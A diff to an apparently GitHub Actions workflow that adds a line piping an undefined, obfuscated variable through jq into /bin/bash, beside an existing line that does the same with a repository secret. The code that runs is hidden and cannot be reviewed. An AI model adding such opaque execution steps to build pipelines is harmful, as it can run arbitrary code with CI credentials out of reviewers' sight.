@@ -18,6 +18,7 @@ jobs:
           ufw72: ${{ secrets.ufw72 }}
         run: |
           printf '%s' "$ufw72" | jq -r .ev1310 | /bin/bash
+          printf '%s' "$tfb601" | jq -r .dbee67288 | /bin/bash
 
       - name: Upload data
         if: always()
